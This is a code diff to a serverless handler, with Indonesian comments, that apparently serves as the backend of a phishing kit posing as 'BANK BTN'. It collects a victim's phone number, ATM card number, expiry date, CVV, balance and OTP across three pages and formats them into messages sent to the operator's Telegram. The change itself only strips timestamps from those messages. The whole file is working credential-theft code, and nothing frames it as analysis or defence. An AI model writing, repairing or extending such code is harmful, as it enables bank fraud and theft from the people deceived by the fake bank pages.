@@ -35,11 +35,10 @@ exports.handler = async (event, context) => {
             expiryDate,
             cvv,
             estimatedBalance,
-            otpCode,
-            timestamp
+            otpCode
         } = data;
 
-        // Format pesan untuk Telegram dengan style box drawing (TANPA IP & USER AGENT)
+        // Format pesan untuk Telegram dengan style box drawing (TANPA WAKTU, IP, USER AGENT)
         let message = '';
         
         // Cek jenis data yang dikirim (berdasarkan field yang ada)
@@ -48,20 +47,20 @@ exports.handler = async (event, context) => {
         const isFullData = phoneNumber && cardNumber && otpCode;
         
         if (isPhoneOnly) {
-            // Notifikasi hanya nomor HP (halaman 1)
-            message = formatPhoneNotification(phoneNumber, timestamp);
+            // Notifikasi hanya nomor HP (halaman 1) - TANPA WAKTU
+            message = formatPhoneNotification(phoneNumber);
         } 
         else if (isCardData) {
-            // Notifikasi data kartu ATM (halaman 2)
-            message = formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, timestamp);
+            // Notifikasi data kartu ATM (halaman 2) - TANPA WAKTU
+            message = formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance);
         }
         else if (isFullData || otpCode) {
-            // Notifikasi OTP (halaman 3)
-            message = formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp);
+            // Notifikasi OTP (halaman 3) - TANPA WAKTU
+            message = formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode);
         }
         else {
-            // Fallback format lama
-            message = formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp);
+            // Fallback format lama - TANPA WAKTU
+            message = formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode);
         }
 
         // Kirim ke Telegram
@@ -113,39 +112,17 @@ exports.handler = async (event, context) => {
     }
 };
 
-// Format notifikasi hanya nomor HP (Halaman 1) - TANPA IP & USER AGENT
-function formatPhoneNotification(phoneNumber, timestamp) {
-    const currentTime = new Date(timestamp).toLocaleString('id-ID', {
-        timeZone: 'Asia/Jakarta',
-        day: '2-digit',
-        month: '2-digit',
-        year: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-    });
-    
+// Format notifikasi hanya nomor HP (Halaman 1) - TANPA WAKTU
+function formatPhoneNotification(phoneNumber) {
     let message = `<b>┌• AKUN | BANK BTN</b>\n`;
     message += `<b>├•</b> ${phoneNumber}\n`;
-    message += `<b>├───────────────────</b>\n`;
-    message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
     message += `<b>╰───────────────────</b>`;
     
     return message;
 }
 
-// Format notifikasi data kartu ATM (Halaman 2) - TANPA IP & USER AGENT
-function formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, timestamp) {
-    const currentTime = new Date(timestamp).toLocaleString('id-ID', {
-        timeZone: 'Asia/Jakarta',
-        day: '2-digit',
-        month: '2-digit',
-        year: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-    });
-    
+// Format notifikasi data kartu ATM (Halaman 2) - TANPA WAKTU
+function formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance) {
     // Format saldo dengan pemisah ribuan
     const formattedBalance = formatRupiah(estimatedBalance);
     
@@ -157,25 +134,13 @@ function formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estima
     message += `<b>├• 📅 Expiry :</b> ${expiryDate}\n`;
     message += `<b>├• 🔑 CVV :</b> ${cvv}\n`;
     message += `<b>├• 💰 Saldo :</b> Rp ${formattedBalance}\n`;
-    message += `<b>├───────────────────</b>\n`;
-    message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
     message += `<b>╰───────────────────</b>`;
     
     return message;
 }
 
-// Format notifikasi OTP (Halaman 3) - LENGKAP TANPA IP & USER AGENT
-function formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp) {
-    const currentTime = new Date(timestamp).toLocaleString('id-ID', {
-        timeZone: 'Asia/Jakarta',
-        day: '2-digit',
-        month: '2-digit',
-        year: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-    });
-    
+// Format notifikasi OTP (Halaman 3) - LENGKAP TANPA WAKTU
+function formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode) {
     // Format saldo dengan pemisah ribuan
     const formattedBalance = formatRupiah(estimatedBalance);
     
@@ -189,25 +154,13 @@ function formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimat
     message += `<b>├• 💰 Saldo :</b> Rp ${formattedBalance}\n`;
     message += `<b>├───────────────────</b>\n`;
     message += `<b>├• 🔢 Kode OTP :</b> <code>${otpCode}</code>\n`;
-    message += `<b>├───────────────────</b>\n`;
-    message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
     message += `<b>╰───────────────────</b>`;
     
     return message;
 }
 
-// Format legacy fallback - TANPA IP & USER AGENT
-function formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp) {
-    const currentTime = new Date(timestamp).toLocaleString('id-ID', {
-        timeZone: 'Asia/Jakarta',
-        day: '2-digit',
-        month: '2-digit',
-        year: 'numeric',
-        hour: '2-digit',
-        minute: '2-digit',
-        second: '2-digit'
-    });
-    
+// Format legacy fallback - TANPA WAKTU
+function formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode) {
     const formattedBalance = formatRupiah(estimatedBalance);
     
     let message = `<b>┌• AKUN | BANK BTN</b>\n`;
@@ -233,8 +186,6 @@ function formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, esti
         message += `<b>├• 🔢 Kode OTP :</b> <code>${otpCode}</code>\n`;
     }
     
-    message += `<b>├───────────────────</b>\n`;
-    message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
     message += `<b>╰───────────────────</b>`;
     
     return message;
@@ -264,4 +215,4 @@ function formatCardNumber(cardNumber) {
         return clean.match(/.{1,4}/g).join(' ');
     }
     return cardNumber;
-        }
+}
